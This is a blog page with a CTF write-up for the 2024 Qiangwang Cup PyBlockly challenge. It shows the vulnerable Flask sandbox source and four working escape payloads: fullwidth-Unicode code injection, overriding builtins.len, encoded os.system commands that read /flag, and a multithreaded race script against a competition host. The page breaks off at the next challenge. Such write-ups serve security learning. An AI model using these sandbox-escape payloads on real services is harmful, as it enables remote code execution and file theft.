<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>24强网杯 | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="24强网PyBlockly题目源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596">
<meta property="og:type" content="article">
<meta property="og:title" content="24强网杯">
<meta property="og:url" content="http://example.com/2024/12/26/24%E5%BC%BA%E7%BD%91%E6%9D%AF/index.html">
<meta property="og:site_name" content="DDL&#39;S BLOG">
<meta property="og:description" content="24强网PyBlockly题目源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/img/avatar.png">
<meta property="article:published_time" content="2024-12-26T13:20:17.000Z">
<meta property="article:modified_time" content="2024-12-26T13:21:23.822Z">
<meta property="article:author" content="DDL">
<meta property="article:tag" content="5wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2024/12/26/24%E5%BC%BA%E7%BD%91%E6%9D%AF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '24强网杯',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">24强网杯</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">24强网杯</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-12-26T13:20:17.000Z" title="Created 2024-12-26 21:20:17">2024-12-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-12-26T13:21:23.822Z" title="Updated 2024-12-26 21:21:23">2024-12-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>15mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="24强网"><a href="#24强网" class="headerlink" title="24强网"></a>24强网</h1><h2 id="PyBlockly"><a href="#PyBlockly" class="headerlink" title="PyBlockly"></a>PyBlockly</h2><h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, jsonify</span><br><span class="line">import re</span><br><span class="line">import unidecode</span><br><span class="line">import string</span><br><span class="line">import ast</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line">import importlib.util</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;JSON_AS_ASCII&#x27;] = False</span><br><span class="line"></span><br><span class="line">blacklist_pattern = r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span><br><span class="line"></span><br><span class="line">def module_exists(module_name):</span><br><span class="line"></span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    if spec is None:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    if module_name in sys.builtin_module_names:</span><br><span class="line">        return True</span><br><span class="line">    </span><br><span class="line">    if spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line">        </span><br><span class="line">        if spec.origin.startswith(std_lib_path) and not spec.origin.startswith(os.getcwd()):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">def verify_secure(m):</span><br><span class="line">    for node in ast.walk(m):</span><br><span class="line">        match type(node):</span><br><span class="line">            case ast.Import:  </span><br><span class="line">                print(&quot;ERROR: Banned module &quot;)</span><br><span class="line">                return False</span><br><span class="line">            case ast.ImportFrom: </span><br><span class="line">                print(f&quot;ERROR: Banned module &#123;node.module&#125;&quot;)</span><br><span class="line">                return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def check_for_blacklisted_symbols(input_text):</span><br><span class="line">    if re.search(blacklist_pattern, input_text):</span><br><span class="line">        print(&#x27;black_list over.&#x27;, re.search(blacklist_pattern, input_text))</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;black_list detected.&#x27;, re.search(blacklist_pattern, input_text))</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def block_to_python(block):</span><br><span class="line">    block_type = block[&#x27;type&#x27;]</span><br><span class="line">    code = &#x27;&#x27;</span><br><span class="line">    </span><br><span class="line">    if block_type == &#x27;print&#x27;:</span><br><span class="line">        text_block = block[&#x27;inputs&#x27;][&#x27;TEXT&#x27;][&#x27;block&#x27;]</span><br><span class="line">        text = block_to_python(text_block)  </span><br><span class="line">        code = f&quot;print(&#123;text&#125;)&quot;</span><br><span class="line">           </span><br><span class="line">    elif block_type == &#x27;math_number&#x27;:</span><br><span class="line">        </span><br><span class="line">        if str(block[&#x27;fields&#x27;][&#x27;NUM&#x27;]).isdigit():      </span><br><span class="line">            code =  int(block[&#x27;fields&#x27;][&#x27;NUM&#x27;]) </span><br><span class="line">        else:</span><br><span class="line">            code = &#x27;&#x27;</span><br><span class="line">    elif block_type == &#x27;text&#x27;:</span><br><span class="line">        if check_for_blacklisted_symbols(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]):</span><br><span class="line">            code = &#x27;&#x27;</span><br><span class="line">        else:</span><br><span class="line">        </span><br><span class="line">            code =  &quot;&#x27;&quot; + unidecode.unidecode(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]) + &quot;&#x27;&quot;</span><br><span class="line">    elif block_type == &#x27;max&#x27;:</span><br><span class="line">        </span><br><span class="line">        a_block = block[&#x27;inputs&#x27;][&#x27;A&#x27;][&#x27;block&#x27;]</span><br><span class="line">        b_block = block[&#x27;inputs&#x27;][&#x27;B&#x27;][&#x27;block&#x27;]</span><br><span class="line">        a = block_to_python(a_block)  </span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  f&quot;max(&#123;a&#125;, &#123;b&#125;)&quot;</span><br><span class="line"></span><br><span class="line">    elif block_type == &#x27;min&#x27;:</span><br><span class="line">        a_block = block[&#x27;inputs&#x27;][&#x27;A&#x27;][&#x27;block&#x27;]</span><br><span class="line">        b_block = block[&#x27;inputs&#x27;][&#x27;B&#x27;][&#x27;block&#x27;]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  f&quot;min(&#123;a&#125;, &#123;b&#125;)&quot;</span><br><span class="line"></span><br><span class="line">    if &#x27;next&#x27; in block:</span><br><span class="line">        </span><br><span class="line">        block = block[&#x27;next&#x27;][&#x27;block&#x27;]</span><br><span class="line">        </span><br><span class="line">        code +=&quot;\n&quot; + block_to_python(block)+ &quot;\n&quot;</span><br><span class="line">    else:</span><br><span class="line">        return code </span><br><span class="line">    return code</span><br><span class="line"></span><br><span class="line">def json_to_python(blockly_data):</span><br><span class="line">    block = blockly_data[&#x27;blocks&#x27;][&#x27;blocks&#x27;][0]</span><br><span class="line"></span><br><span class="line">    python_code = &quot;&quot;</span><br><span class="line">    python_code += block_to_python(block) + &quot;\n&quot;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    return python_code</span><br><span class="line"></span><br><span class="line">def do(source_code):</span><br><span class="line">    hook_code = &#x27;&#x27;&#x27;</span><br><span class="line">def my_audit_hook(event_name, arg):</span><br><span class="line">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span><br><span class="line">    if len(event_name) &gt; 4:</span><br><span class="line">        raise RuntimeError(&quot;Too Long!&quot;)</span><br><span class="line">    for bad in blacklist:</span><br><span class="line">        if bad in event_name:</span><br><span class="line">            raise RuntimeError(&quot;No!&quot;)</span><br><span class="line"></span><br><span class="line">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">    print(&#x27;do!&#x27;)</span><br><span class="line">    print(&#x27;Source code: &#x27;,source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = compile(source_code, &quot;run.py&quot;, &#x27;exec&#x27;, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    try:</span><br><span class="line">        if verify_secure(tree):  </span><br><span class="line">            with open(&quot;run.py&quot;, &#x27;w&#x27;) as f:</span><br><span class="line">                f.write(code)        </span><br><span class="line">            result = subprocess.run([&#x27;python&#x27;, &#x27;run.py&#x27;], stdout=subprocess.PIPE, timeout=5).stdout.decode(&quot;utf-8&quot;)</span><br><span class="line">            os.remove(&#x27;run.py&#x27;)</span><br><span class="line">            return result</span><br><span class="line">        else:</span><br><span class="line">            return &quot;Execution aborted due to security concerns.&quot;</span><br><span class="line">    except:</span><br><span class="line">        os.remove(&#x27;run.py&#x27;)</span><br><span class="line">        return &quot;Timeout!&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return app.send_static_file(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/blockly_json&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def blockly_json():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    print(type(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(&#x27;utf-8&#x27;))</span><br><span class="line">    print(blockly_data)</span><br><span class="line">    try:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        print(python_code)</span><br><span class="line">        return do(python_code)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return jsonify(&#123;&quot;error&quot;: &quot;Error generating Python code&quot;, &quot;details&quot;: str(e)&#125;)</span><br><span class="line">    </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host = &#x27;0.0.0.0&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unidecode.unidecode</span><br><span class="line"> 将所有 Unicode 字符（尤其是非 ASCII 字符）转换成可打印的、没有重音符号或特殊符号的 ASCII 字符</span><br></pre></td></tr></table></figure>

<p><code>dd if=/flag</code>，它意味着你试图将 <code>/flag</code> 文件的数据拷贝到标准输出</p>
<p>逃逸字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code =  &quot;&#x27;&quot; + unidecode.unidecode(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]) + &quot;&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p>将len函数替换成匿名函数使其永远返回 1</p>
<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>ssti，全字符绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;os&quot;).system(&quot;$(printf &#x27;\144\144\40\151\146\75\57\146\154\141\147&#x27;)&quot;)</span><br></pre></td></tr></table></figure>

<p>利用$()执行内容来输出</p>
<p>cat tac nl没有，用dd可以</p>
<p>dd if&#x3D;&#x2F;flag</p>
<p>然后再对这些内容使用全角，绕过黑名单。</p>
<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;blocks&quot;:&#123;&quot;blocks&quot;:[&#123;&quot;type&quot;:&quot;text&quot;,&quot;fields&quot;:&#123;&quot;TEXT&quot;:&quot;＇；＿＿ｉｍｐｏｒｔ＿＿（＂ｂｕｉｌｔｉｎｓ＂）．ｌｅｎ＝ｌａｍｂｄａ ａ：１；＇＇；＿＿ｉｍｐｏｒｔ＿＿（＂ｏｓ＂）．ｓｙｓｔｅｍ（＂＄（ｐｒｉｎｔｆ ＇＼１４４＼１４４＼４０＼１５１＼１４６＼７５＼５７＼１４６＼１５４＼１４１＼１４７＇）；   ＂）；＇&quot;&#125;</span><br><span class="line">&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>跟法二差不多</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;blocks&quot;:&#123;&quot;blocks&quot;:[&#123;&quot;type&quot;:&quot;text&quot;,&quot;fields&quot;:&#123;&quot;TEXT&quot;:&quot;‘\n＿＿import＿＿（”builtins”）。len＝lambda a：1；＿＿import＿＿（‘os’）。system（‘ls＄IFS＄9／’）＃&quot;&#125;,&quot;inputs&quot;:&#123;&#125;&#125;]&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#x27;\n__import__(&quot;builtins&quot;).len=lambda a: 1;__import__(&#x27;os&#x27;).system(&#x27;ls$IFS$9/&#x27;) #</span><br></pre></td></tr></table></figure>

<h3 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h3><p>dd if&#x3D;&#x2F;flag写入到1.py，第二次发包利用run.py执行1.py</p>
<p>写文件</p>
<p>读取&#x2F;flag写入1.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(bytes. fromhex(&#x27;312e7079&#x27;). decode(),&#x27;wb&#x27;). write(bytes. fromhex(&#x27;696d706f7274206f730a0a7072696e74286f732e706f70656e282764642069663d2f666c616727292e72656164282929&#x27;))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;1&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id="法四"><a href="#法四" class="headerlink" title="法四"></a>法四</h3><p>多线程竞争</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">url = &quot;http://eci-2zedptpxwuwj344tkegy.cloudeci1.ichunqiu.com:5000&quot;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;blocks&quot;: &#123;</span><br><span class="line">        &quot;blocks&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;type&quot;: &quot;print&quot;,</span><br><span class="line">                &quot;x&quot;: 101,</span><br><span class="line">                &quot;y&quot;: 102,</span><br><span class="line">                &quot;inputs&quot;: &#123;</span><br><span class="line">                    &quot;TEXT&quot;: &#123;</span><br><span class="line">                        &quot;block&quot;: &#123;</span><br><span class="line">                            &quot;type&quot;: &quot;max&quot;,</span><br><span class="line">                            &quot;inputs&quot;: &#123;</span><br><span class="line">                                &quot;A&quot;: &#123;</span><br><span class="line">                                    &quot;block&quot;: &#123;</span><br><span class="line">                                        &quot;type&quot;: &quot;text&quot;,</span><br><span class="line">                                        &quot;fields&quot;: &#123;&quot;TEXT&quot;: &quot;‘，‘’））\n（open（bytes。fromhex（’72756e2e7079‘）。decode（），’wb‘）。write（bytes。fromhex（’696d706f7274206f730a0a7072696e74286f732e706f70656e282764642069663d2f666c616727292e72656164282929‘）））\n\nprint（print（’1&quot;&#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &quot;B&quot;: &#123;</span><br><span class="line">                                    &quot;block&quot;: &#123;</span><br><span class="line">                                        &quot;type&quot;: &quot;math_number&quot;,</span><br><span class="line">                                        &quot;fields&quot;: &#123;&quot;NUM&quot;: 10&#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def send_request():</span><br><span class="line">    while True:</span><br><span class="line">        r = requests.post(url + &quot;/blockly_json&quot;,</span><br><span class="line">                          headers=&#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;, data=json.dumps(data))</span><br><span class="line">        text = r.text</span><br><span class="line">        if &quot;1 10&quot; not in text and &quot;No such file or direct&quot; not in text and len(text) &gt; 10:</span><br><span class="line">            print(text)</span><br><span class="line">            os.exit(-1)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line">num_threads = 100</span><br><span class="line"></span><br><span class="line">for _ in range(num_threads):</span><br><span class="line">    thread = threading.Thread(target=send_request)</span><br><span class="line">    threads.append(thread)</span><br><span class="line">    thread.start()</span><br><span class="line"></span><br><span class="line">for thread in threads:</span><br><span class="line">    thread.join()</span><br></pre></td></tr></table></figure>

<h2 id="xiaohuanxiong"><a href="#xiaohuanxiong" class="headerlink" title="xiaohuanxiong"></a><strong>xiaohuanxiong</strong></h2><p>源码审计，需从网上下源码；正确源码地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/forkable/xiaohuanxiong.git</span><br></pre></td></tr></table></figure>

<h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><h3 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h3><p>漏洞源码如下↓</p>
